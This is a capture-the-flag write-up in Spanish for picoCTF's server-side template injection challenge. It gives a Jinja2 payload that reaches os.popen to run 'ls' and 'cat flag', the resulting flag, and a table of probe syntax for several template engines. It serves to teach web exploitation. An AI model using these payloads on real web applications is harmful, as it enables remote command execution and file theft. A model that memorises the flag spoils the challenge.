
## Descripción

*I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:64372/)!*


## Pistas

*Server Side Template Injection*

## Solución


```
http://rescued-float.picoctf.net:64372/

# Home

I built a cool website that lets you announce whatever you want!*

What do you want to announce:  {{7*7}}=Error ok

#Es lo que nos dice la descripcion 
http://rescued-float.picoctf.net:64372/announce
# 49= error


http://rescued-float.picoctf.net:64372/announce
#{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}
# __pycache__ app.py flag requirements.txt

http://rescued-float.picoctf.net:64372/announce
# {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_3066c7bd}

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_3066c7bd}
## Notas Adicionales 

*SSTI: es cuando una app web permite enviar datos que son procesados en una plantilla, pero no tienen validaciones adecuadas, los motores de plantillas de utilizan para generar contenido dinámico, pero se puede inyectar código malicioso.*

*Motores de plantillas
Jinja2 (Python Flask/Django) : {{ 7*7 }}  
Freemarker (Java) : ${7*7}  
Velocity (Java) : #set($a = 7*7)${a}  
*Thymeleaf (Java) : ${7*7}  
*Twig (PHP Symfony) : {{ 7*7 }}  
*Smarty (PHP) : {$7*7}  
*Mako (Python): <% print 7*7 %>*

Insertamos en el campo de la pagina, {{5x9}}

despues de ver el resultado significa que si es vulnerable entonces, cargamos la plantilla
y luego con ls vemos cuales son los archivos que hay dentro:
self._TemplateReference__context.cycler.__init__.__globals__.os.popen(‘id’).read() }}
y luego un cat {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen(' **cat flag** ').read() }}
y nos muestra la bandera.

## Referencias 
http://rescued-float.picoctf.net:64372/

https://medium.com/@Kamal_S/picoctf-web-exploitation-ssti1-e2363b1885a0